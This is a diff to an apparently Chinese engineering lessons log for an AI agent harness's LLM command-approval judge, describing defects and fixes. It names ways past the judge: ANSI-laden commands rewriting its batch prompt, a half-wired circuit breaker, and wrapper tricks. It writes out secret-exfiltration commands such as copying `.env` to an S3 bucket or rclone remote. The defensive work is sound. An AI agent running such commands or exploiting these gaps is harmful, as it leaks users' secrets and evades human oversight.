@@ -1078,6 +1078,56 @@ full-access 仍拒秘密；`test_approval_scope.py` 与 `test_exec_policy.py` �
 
 ---
 
+## 问题：审查官的批量路径与单条路径不是同一套判定
+
+两条路径各写一份 prompt，差异不在文风而在防御：单条有 `JUDGE_DETAIL_BUDGET` 超预算升级、
+`_judge_facts` 事实段、控制字符转义和 `HARNESS_JUDGE_MODEL`；批量只把裸命令拼成
+`[0] cmd`。同一条命令单审有事实、批判没事实；带 ANSI 的命令还能借批量改写提示词。
+熔断也只接了一半：`judge_broken` 只在 `preflight_judge` 里被判，`enforce` 的单条闸门
+不查，停用之后交互式每条 ASK 仍会白等一次 30s 超时。
+
+同轮核出的名单洞（实测 workspace-write / on-request）：`aws s3 cp .env s3://b/k`、
+`rclone copy .env remote:b`、`gcloud … delete`、`pip install`、`npx`、`Start-Process`
+全部 ALLOW；`nohup`/`xargs` 虽然 ASK，但同类键记在包装器上，批一次等于开放整类。
+
+## 做法
+
+- `_judge_payload()` 成为唯一的 payload 构造器：触发原因、事实段、转义后的 detail 只写
+  一处，批量按条复用；超预算的候选跳过，留给单条路径升级人工，不在半条命令上盲批。
+- `_judge_model()` 统一 `HARNESS_JUDGE_MODEL` 回退；批量统计部分放行也记一次 `escalated`。
+- 熔断判断移进 `_judge_auto_approve` 的缓存未命中分支：缓存命中仍放行，新判定直接转人工。
+- `EXTERNAL_OPERATIONS` 收云 CLI 与包管理器，`_NO_SESSION_GRANT` 由它和启动器名单合并；
+  前缀包装器逐段逐层剥开再判定，同类键落在内层命令上（`nohup rm -rf build` → `rm`）；
+  `_strip_wrappers_in_segments` 同时服务策略判定、`bash -c` 的载荷递归和同类键，
+  三处共用一份规则。
+- `secret_references()` 按文件名扫 bash 的 token；命中且命令里有出口/外部操作时升级为
+  `secret_egress`。不做路径解析、不硬拒：`grep .env docs` 这类正常文本用法误伤面比
+  文件工具大，要不要拦由人看完整条命令决定。
+- 飞书侧补审查官放行通知：`recent_permissions()` 读 `/v1/permissions` 的 `recent`，按
+  会话归属推一条不带按钮的提示；只推网关启动之后产生的请求（重启不补历史），去重集合
+  与 pending 的通知集合分开——后者每轮按 pending 收敛，混用会重复通知。
+
+## 测试
+
+`test_exec_policy.py` 新增云 CLI/包管理器/启动器矩阵、包装器判定与同类键、秘密外发；
+`test_approval_judge.py` 新增批量 payload 与单条同源、超预算候选不进批量，并把熔断用例
+补到「单条路径也不得再调 LLM」。
+
+## 收获
+
+- **两条路径的防御必须同源**：复制一份 prompt 就是复制一份遗漏，差异迟早出现在最危险
+  的那条路上。
+- **熔断是状态，不是参数**：只在批量入口查一次，等于给单条路径留了每次 30s 的后门。
+- **同类键要落在真正执行的动作上**：包装器不是动作，按它记账买的是整类命令。
+- **秘密检查要看数据流向**：本地读放开是既定策略，外发才是要人看一眼的那一步。
+- **「少问」要配「知道被少问了什么」**：自动放行不占审批面，就必须在同一个界面留痕，
+  否则用户只会看到工具悄悄执行了。
+- **剥包装器必须按段**：只剥整条命令的开头时，`true; nohup aws s3 cp .env …` 是 ALLOW，
+  而同类键却按段算——判定比免审键更松，边界就落在松的那一侧。判定、`bash -c` 载荷递归
+  和同类键必须共用同一份剥离规则。
+
+---
+
 ## 核心教训总纲
 
 1. **每个 tool_call 都必须有 tool 结果**——阻断 ≠ 跳过，阻断也要返回一条 tool 消息。
